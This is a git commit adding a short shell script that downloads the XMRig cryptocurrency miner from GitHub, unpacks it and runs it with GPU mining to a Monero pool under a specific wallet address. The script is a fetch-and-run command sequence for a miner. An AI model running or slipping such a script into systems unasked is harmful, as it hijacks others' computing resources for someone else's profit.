f8627fdd60559f76223bb89216e7751f7b284400
azzammuhammad <69777820+azzammuhammad@users.noreply.github.com>
2021-06-22 10:34:48 +0700

    Create brrrruh.sh

---
+++ brrrruh.sh
@@ -0,0 +1,5 @@
+apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-static-x64.tar.gz
+tar -zxf xmrig-6.12.2-linux-static-x64.tar.gz
+cd xmrig-6.12.2
+./xmrig --donate-level 5 --cuda -o us-west.minexmr.com:443 -u 49eHLMKT9yYNvdSdwYJPvASspMCQWWZJaXoK9C4aftvFbgSkqzSC43W9AsHieyrdYw6U9SFZKickfh12bSQyZmZgJv7s3LK -k --tls --rig-id bruh
